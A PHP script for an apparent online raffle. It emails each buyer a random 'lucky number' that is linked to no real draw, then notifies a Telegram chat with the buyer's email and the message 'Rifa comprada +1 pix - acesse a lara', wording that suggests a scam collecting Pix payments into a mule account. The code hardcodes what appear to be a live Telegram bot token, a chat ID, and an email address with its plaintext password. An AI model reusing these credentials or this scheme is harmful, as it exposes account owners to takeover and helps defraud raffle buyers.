<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer-master/src/Exception.php';
require 'PHPMailer-master/src/PHPMailer.php';
require 'PHPMailer-master/src/SMTP.php';

function enviarMensagemTelegram($mensagem, $email) {
    // TOKEN BOT DO TELEGRAM E O SEU ID 
    $telegramBotToken = '8095649222:AAHMEz-SCb5U8XUPBLx0PpeGgLlo9_vLBgE'; 
    $telegramChatID = '5639319031';

    $telegramURL = "https://api.telegram.org/bot$telegramBotToken/sendMessage";

    $params = [
        'chat_id' => $telegramChatID,
        'text' => "🦆 LOG DUCKETTSTONE\n\n🔔 $mensagem \n📢 $email"
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramURL);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if ($response === false) {
        echo "Erro ao enviar mensagem para o Telegram: " . curl_error($ch);
    } else {
        echo "Mensagem enviada para o Telegram com sucesso!";
    }

    curl_close($ch);
}

$mail = new PHPMailer(true);

try {
    $codigo = rand(1000, 9999);

    // COLOCA SEU EMAIL OUTLOOK DE PREFERENCIA LEMBRANDO QUE LA EM BAIXO TEM QUE MUDAR TAMBEM
    $mail->isSMTP();
    $mail->Host = 'smtp.office365.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'clebber015@gmail.com'; // SEU EMAIL AQUI VEI PELA MOR DE DEUS 
    $mail->Password = 'vida070790'; // SENHA DO SEU EMAIL MANO
    $mail->SMTPSecure = 'tls';
    $mail->Port = 587; // padrao de todas
    
    $mail->CharSet = 'UTF-8';

    $emailCliente = $_POST['campoEmail'];
    $mail->setFrom('meuemail@outlook.com', 'Rifa online');  //AQUI VOCE TEM QUE COLOCAR O QUE FALEI ALI EM CIMA E COLOCA SEU EMAIL OUTLOOK
    $mail->addAddress($emailCliente);

    $mail->isHTML(true);
    $mail->Subject = 'Rifa comprada!';
    $mail->Body = '
    <html>
    <head>
    <style>
        body { font-family: Arial, sans-serif; }
        .header { background-color: #f2f2f2; padding: 20px; text-align: center; }
        .content { margin: 20px; text-align: center; }
        .footer { background-color: #f2f2f2; padding: 10px; text-align: center; font-size: 12px; }
    </style>
    </head>
    <body>
        <div class="content">
            <p>Parabéns! Você comprou um número.</p>
            <p><strong>Número da Sorte:</strong> ' . $codigo . '</p>
        </div>
        <div class="footer">
            <p>Obrigado por participar. Boa sorte!</p>
        </div>
    </body>
    </html>
    ';
    $mail->AltBody = 'Seu número da sorte é: ' . $codigo;

    $mail->send();

    enviarMensagemTelegram('Rifa comprada +1 pix - acesse a lara senhor(a)', $emailCliente);

    header('Location: index.html');
    exit;
} catch (Exception $e) {
    echo "Erro ao enviar o código: {$mail->ErrorInfo}";
}
?>
